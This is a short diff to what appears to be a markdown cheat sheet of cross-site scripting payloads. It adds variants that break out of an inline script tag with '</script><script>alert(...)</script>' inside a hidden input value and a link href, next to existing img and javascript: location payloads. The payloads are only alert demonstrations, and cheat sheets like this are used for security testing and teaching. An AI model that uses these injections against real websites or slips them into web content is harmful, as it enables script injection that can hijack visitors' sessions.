@@ -161,6 +161,12 @@ location=/javascript:alert%2823%29/.source;
 </script>
 
 <img src="</script><script>alert(origin)</script>">
+or
+<input type="hidden" value="</script><script>alert(1)</script>">
+or 
+<a href="</script><script>alert(3)</script>" value="xxx">TEST<a>
+
+which can be in between quotes... 
 ```
 #### With </script>
 ```html
